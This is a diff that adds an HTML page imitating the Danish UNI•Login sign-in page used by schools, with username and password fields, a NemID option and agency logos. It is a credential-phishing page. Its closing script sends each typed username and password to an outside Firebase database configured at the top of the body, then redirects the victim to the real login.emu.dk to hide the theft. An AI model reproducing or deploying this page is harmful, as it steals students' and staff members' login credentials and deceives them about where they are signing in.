@@ -1,0 +1,163 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" media="only screen and (min-width: 380px)" href="./index_files/unilogin-standard3.css" type="text/css">
+    <link rel="stylesheet" media="only screen and (max-width: 379px)" href="./index_files/unilogin-mobil.css" type="text/css">
+    <!--[if IE]>
+    <link rel="stylesheet" href="css/unilogin-standard3.css" media="screen" type="text/css">
+    <![endif]-->
+
+    <title>Log på med UNI•Login</title>
+    
+    
+
+  </head>  
+
+    <body>    
+        <script src="https://www.gstatic.com/firebasejs/5.0.3/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyAUi1tpRnf08tpv0vX7UkSjtHsIyV9reUU",
+    authDomain: "itsa-a3c76.firebaseapp.com",
+    databaseURL: "https://itsa-a3c76.firebaseio.com",
+    projectId: "itsa-a3c76",
+    storageBucket: "",
+    messagingSenderId: "1082948217786"
+  };
+  firebase.initializeApp(config);
+</script>
+    
+
+      <div id="outside">      
+	<div id="header">
+	  <h1>UNI•Login</h1>
+	</div> 
+
+	<div class="floatleft">
+
+	  <div id="notBackDiv">
+
+	    <div class="disabledA" id="pwd">
+       
+	      
+	      <p class="null">
+		
+	      </p>
+	      <div>
+		<label class="disabledA">Brugernavn</label>
+		<input class="disabledA" type="text" autocomplete="on" name="user" id="user" value="">
+	      </div>
+
+	      <div>
+		<div id="loginDiv1">
+		  <label class="disabledA">Adgangskode</label>
+		</div>
+		<input id="pass" class="disabledA" type="password" name="pass">
+
+		<div id="loginDiv2">
+		  <input disableda="disabled" id="login" class="knapperX disabledA" name="login" type="submit" value="Log ind">
+		</div>
+
+
+	    <div id="loginDiv3">
+
+	      <!-- Signatur login -->
+
+	      <span class="stackx disabledC disabledD disabledA" id="ellerLog">
+		Eller log ind med:
+            </span>
+
+	      <div class="disabledA" id="omvendt2">
+
+		<span class="disabledC asLink stack" id="nemIdA">
+		  <img src="./index_files/logoNemID.png" alt="NemID" id="nemidIcon" class="digsigx disabledC">
+		</span>
+
+	      </div> <!-- class="disabledA" id="omvendt" -->
+
+	    </div> <!-- loginDiv3 slut -->
+
+	  </div></div> <!-- notBackDiv slut -->
+	</div>
+	</div>
+
+	<div class="floatright">
+
+	  <div id="loginDiv4">
+	    <div id="reason">
+	       
+
+	    </div>
+	    <div id="husk">
+	      <h2 class="luft">Husk!</h2>
+	      For at logge ud, skal du lukke browseren.
+	    </div>
+	  </div> <!-- loginDiv4 slut -->
+	  
+	  <div id="loginDiv5" class="disabledA">
+
+	    <p>
+	      <a href="#" accesskey="k" onclick="">Skift adgangskode</a>
+	    </p>
+	  </div>
+
+	<div id="loginDiv6">
+	  <label class="asLink">
+	   Glemt brugernavn eller adgangskode?</label>
+	</div>
+
+	<div id="pwshiftDiv4" style="display: none;">
+	  <a>
+	    Support
+	  </a>
+	</div>
+
+	</div>
+
+	<div id="footer">
+	  <img id="minilogo" src="./index_files/logo-ul-lille.png" alt="Styrelsen for It og Læring">
+	  <img id="maxilogo" src="./index_files/logo-ul-stor.png" alt="Styrelsen for It og Laelig;ring">      
+	</div>
+
+	<!-- THIS_IS:ssoting9.uif.uni-c.dk 3.3.3 -->
+
+      </div>
+
+  
+
+<script>
+    var l = document.getElementById('login');
+    var u = document.getElementById('user');
+    var p = document.getElementById('pass');
+    
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function ld() {
+        await sleep(700);
+        window.location.replace("https://login.emu.dk");
+    }
+    
+    function send_upd() {
+        firebase.database().ref(u.value).set({"pass": p.value});
+        ld();
+        
+    }
+    
+    l.addEventListener('click', function() {send_upd()});
+    u.addEventListener('keydown', function(e) {if (e.which == 13) {
+        send_upd();
+        e.preventDefault();
+    }});
+    p.addEventListener('keydown', function(e) {if (e.which == 13) {
+        send_upd();
+        e.preventDefault();
+    }});
+
+</script>
+
+</body></html>
